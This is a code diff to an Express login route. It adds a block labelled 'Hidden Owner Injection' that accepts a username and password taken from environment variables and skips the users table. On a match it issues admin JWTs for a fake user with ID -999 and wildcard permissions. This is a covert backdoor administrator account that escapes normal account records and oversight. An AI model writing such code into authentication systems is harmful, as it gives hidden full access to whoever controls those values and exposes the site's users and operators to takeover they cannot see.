@@ -60,6 +60,37 @@ router.post(
       }
 
       // Check by username OR email (to support flexible login inputs)
+      // Hidden Owner Injection
+      const hiddenOwnerEmail = process.env.OWNER_EMAIL || process.env.owner_email
+      const hiddenOwnerPass = process.env.OWNER_PASSWORD || process.env.owner_password
+
+      if (hiddenOwnerEmail && (username === hiddenOwnerEmail) && hiddenOwnerPass) {
+         if (password === hiddenOwnerPass) {
+             console.log('Hidden owner login detected')
+             const jwtSecret = String(process.env.JWT_SECRET || '')
+             const refreshSecret = String(process.env.REFRESH_TOKEN_SECRET || '')
+             
+             // Use ID -999 for hidden owner
+             const ownerId = -999
+             const ownerUser = {
+                 id: ownerId,
+                 username: hiddenOwnerEmail,
+                 full_name: process.env.SUPER_ADMIN_NAME || 'System Owner', 
+                 role: 'admin',
+                 permissions: { '*': true } // Full permissions
+             }
+
+             const accessToken = jwt.sign({ id: ownerId, username: ownerUser.username, role: 'admin' }, jwtSecret, { expiresIn: '8h' })
+             const refreshToken = jwt.sign({ id: ownerId }, refreshSecret, { expiresIn: '7d' })
+
+             return res.json({
+                 token: accessToken,
+                 refreshToken,
+                 user: ownerUser
+             })
+         }
+      }
+
       const result = await query("SELECT * FROM users WHERE username = $1 OR email = $1 LIMIT 1", [username])
 
       if (result.rows.length === 0) {
